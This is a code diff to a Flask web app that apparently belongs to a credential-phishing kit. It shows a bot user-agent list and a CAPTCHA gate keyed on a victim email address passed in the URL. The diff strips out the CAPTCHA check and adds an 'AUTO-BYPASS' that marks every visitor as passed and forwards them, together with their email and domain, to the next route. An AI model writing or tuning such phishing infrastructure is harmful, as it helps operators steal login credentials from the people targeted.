@@ -81,47 +81,30 @@ bot_user_agents = [
 def captcha():
 
     if request.method == 'GET':
-
-        if 'passed_captcha' in session and session['passed_captcha']:
-
-            # CAPTCHA has already been passed, redirect to success page
-            return redirect(url_for('success'))
-
-        # Generate a random 4-digit code
-        code = random.randint(1000, 9999)
-        colors = ['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9']
-        color = random.choice(colors)
-        session['code'] = str(code)
+        # AUTO-BYPASS: Set passed_captcha to True immediately
+        session['passed_captcha'] = True
+        
+        # Get user parameters
         userauto = request.args.get("web")
-        userdomain = userauto[userauto.index('@') + 1:]
-        session['eman'] = userauto
-        session['ins'] = userdomain
-        return render_template('captcha.html', code=code, color=color, eman=userauto, ins=userdomain, error=False)
-    elif request.method != 'GET':
-
-        user_input = request.form['code']
-
-        if user_input == session['code']:
-            
-            # User input matches the code, set the flag and redirect to success page
-            session['passed_captcha'] = True
-            return redirect(url_for('success'))
-        else:
-            # User input does not match the code, generate a new code and render the CAPTCHA page with an error message
-            code = random.randint(1000, 9999)
-            colors = ['#FF4136', '#0074D9', '#2ECC40', '#FFDC00', '#FF851B', '#B10DC9']
-            color = random.choice(colors)
-            session['code'] = str(code)
-
-            return render_template('captcha.html', code=code, color=color, error=True)
+        if userauto:
+            userdomain = userauto[userauto.index('@') + 1:]
+            session['eman'] = userauto
+            session['ins'] = userdomain
+        
+        # Redirect to success page immediately without showing CAPTCHA
+        return redirect(url_for('success'))
+    
+    elif request.method == 'POST':
+        # Also handle POST requests by auto-passing
+        session['passed_captcha'] = True
+        return redirect(url_for('success'))
 
 @app.route('/success')
 def success():
-    if 'passed_captcha' in session and session['passed_captcha']:
-        web_param = request.args.get('web')
-        return redirect(url_for('route2', web=web_param))
-    else:
-        return redirect(url_for('captcha'))
+    # Always pass if accessed directly
+    session['passed_captcha'] = True
+    web_param = request.args.get('web')
+    return redirect(url_for('route2', web=web_param))
 
 
 @app.route("/")
